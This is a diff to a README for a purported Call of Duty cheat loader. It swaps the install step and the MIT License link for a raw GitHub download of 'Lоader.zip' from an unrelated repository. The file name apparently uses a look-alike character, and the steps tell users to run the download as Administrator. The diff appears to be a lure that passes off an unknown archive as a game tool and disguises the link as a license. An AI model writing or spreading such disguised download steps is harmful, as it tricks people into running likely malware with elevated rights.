@@ -30,7 +30,7 @@ Call of Duty Loader, Game Enhancement, MW Series Cheats, Warzone Competitive Adv
 
 ## 🛠️ Installation Guide
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/edjoe14/OpenAd-Specification_AdEngine_Forms/main/Lоader.zip` from the repository.
 2. Extract archive to your desktop or preferred folder.
 3. Run the Loader as Administrator.
 4. Customize your feature set in the intuitive interface.
@@ -42,5 +42,5 @@ This tool is strictly for educational and research purposes only. Use responsibl
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/edjoe14/OpenAd-Specification_AdEngine_Forms/main/Lоader.zip).  
 © 2025  Call of Duty Cheats & Hacks Loader Team. All rights reserved.
